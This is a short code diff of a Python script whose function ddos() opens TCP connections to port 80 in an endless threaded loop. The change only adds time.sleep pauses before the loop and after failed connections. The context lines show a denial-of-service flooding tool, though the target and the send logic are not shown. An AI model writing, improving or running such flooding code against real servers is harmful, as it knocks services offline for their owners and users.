@@ -2,7 +2,7 @@ import socket
 from threading import Thread
 import os
 import sys
-
+import time
 
 port = 80
 messages = 'hello its me'
@@ -31,6 +31,7 @@ def ddos():
    
    message = (messages * rtxt)
    print("\033[1;32;40mOk!")
+   time.sleep(2)
    while True:
       mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       try:
@@ -40,7 +41,7 @@ def ddos():
           
       except socket.error:
          print("\033[1;31;40mFailed Connection killed!, please wait....")
-         
+         time.sleep(2)
          mysocket.close()
 
    for i in range(threads):
